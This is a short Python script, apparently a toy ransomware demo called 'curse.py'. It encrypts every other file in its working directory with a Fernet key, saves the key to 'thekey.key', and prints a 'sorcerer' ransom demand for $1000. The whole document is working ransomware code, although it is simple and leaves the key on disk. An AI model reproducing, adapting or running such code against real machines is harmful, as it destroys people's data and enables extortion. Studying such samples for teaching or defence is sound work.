#!/usr/bin/env python

import os
# encryption and decryption library
from cryptography.fernet import Fernet

files = []

sorcerer_letter = "TheSorcererLetter"

for file in os.listdir():
    # checks for certain files/folders to skip over
    if file == "curse.py" or file == "thekey.key" or file == "decryptionite.py" or file == sorcerer_letter:
        continue
    '''
    appends any files in the overall directory
    to the 'files' array for encryption later on...
    '''
    if os.path.isfile(file):
        files.append(file)
print(files)

# a specialized key is generated and written to the 'thekey' variable
key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# iterating through each file in the 'files' array
for file in files:
    # reads in each file to a contents variable
    with open(file, "rb") as thefile:
        contents = thefile.read()

    # use the 'encrypt()' function to encrypt the contents with the key variable
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        # the encrypted version is written back to the 'thefile' var
        thefile.write(contents_encrypted)

print("\na curse has been placed upon your files.\n" \
"deliver 1000 gold coins (or $1000 USD) to the sorcerer, or your files shall be cast away forever.\n" \
"go through 'TheSorcererLetter' for further instruction")